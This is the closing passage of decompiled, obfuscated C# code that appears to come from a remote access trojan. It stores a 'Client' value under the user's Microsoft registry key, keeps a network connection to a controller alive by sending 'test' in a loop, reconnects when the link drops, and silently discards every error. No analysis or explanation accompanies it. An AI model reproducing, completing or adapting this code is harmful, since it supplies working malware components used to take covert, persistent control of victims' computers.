											((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text4, RegistryValueKind.String);
										}
									}
									catch (Exception projectError12)
									{
										ProjectData.SetProjectError(projectError12);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError13)
								{
									ProjectData.SetProjectError(projectError13);
									ProjectData.ClearProjectError();
								}
							}
							catch (Exception projectError14)
							{
								ProjectData.SetProjectError(projectError14);
								ProjectData.ClearProjectError();
							}
							continue;
						}
						QSWSDxTR122(5);
						rzP3M15++;
						if (rzP3M15 <= 5)
						{
							continue;
						}
						try
						{
							Yomi430.WriteLine("test");
							Yomi430.Flush();
						}
						catch (Exception projectError34)
						{
							ProjectData.SetProjectError(projectError34);
							try
							{
								if (!opAkC28.Connected)
								{
									ProjectData.ClearProjectError();
									break;
								}
							}
							catch (Exception projectError35)
							{
								ProjectData.SetProjectError(projectError35);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError36)
					{
						ProjectData.SetProjectError(projectError36);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					vRddgi94130();
					Thread.Sleep(100);
				}
				catch (Exception projectError37)
				{
					ProjectData.SetProjectError(projectError37);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
